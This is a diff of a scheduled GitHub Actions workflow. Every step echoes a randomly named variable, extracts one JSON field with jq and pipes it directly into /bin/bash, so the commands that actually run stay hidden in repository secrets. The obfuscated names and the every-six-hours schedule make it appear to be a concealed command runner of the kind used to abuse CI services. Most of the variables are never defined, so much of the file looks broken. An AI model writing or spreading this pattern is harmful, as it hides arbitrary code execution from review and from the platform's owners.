@@ -1,9 +1,9 @@
 name: xuguoqiang3456
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 0/6 * * *'
-
+    - cron: '50 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,11 +12,23 @@ jobs:
       - uses: actions/checkout@v4
       - name: xuguoqiang3456
         env:
-          qesaw62: ${{ secrets.qesaw62 }}
+          ckj22: ${{ secrets.ckj22 }}
         run: |
-          echo $qesaw62 | jq -r .vw0 | /bin/bash
-          echo $zr81482 | jq -r .zq82319 | /bin/bash
-          echo $ne9933 | jq -r .oe39 | /bin/bash
-          echo $i48 | jq -r .n0416 | /bin/bash
-          echo $gpit5 | jq -r .qh98 | /bin/bash
+          echo $ckj22 | jq -r .ders75 | /bin/bash
+          echo $tdn2465 | jq -r .cgyi416 | /bin/bash
+          echo $qmps1987 | jq -r .xgbw9 | /bin/bash
+          echo $sby6 | jq -r .wqsti7 | /bin/bash
+          echo $sn38552 | jq -r .w48962 | /bin/bash
+          echo $b53071 | jq -r .zbw21752 | /bin/bash
+          echo $v1207 | jq -r .ztg68 | /bin/bash
+          echo $zd7 | jq -r .cq3072 | /bin/bash
+          echo $glr08 | jq -r .zuer9 | /bin/bash
+          echo $mvhk85815 | jq -r .nf409 | /bin/bash
+          echo $vff9551 | jq -r .nhhaj1882 | /bin/bash
+          echo $f6 | jq -r .wzw094 | /bin/bash
+          echo $uegne1 | jq -r .rixdf5 | /bin/bash
+          echo $hczc7055 | jq -r .j556 | /bin/bash
+          echo $qj268 | jq -r .v9 | /bin/bash
+          echo $jz2 | jq -r .egmtw26 | /bin/bash
+          echo $z55226 | jq -r .sw57 | /bin/bash
 
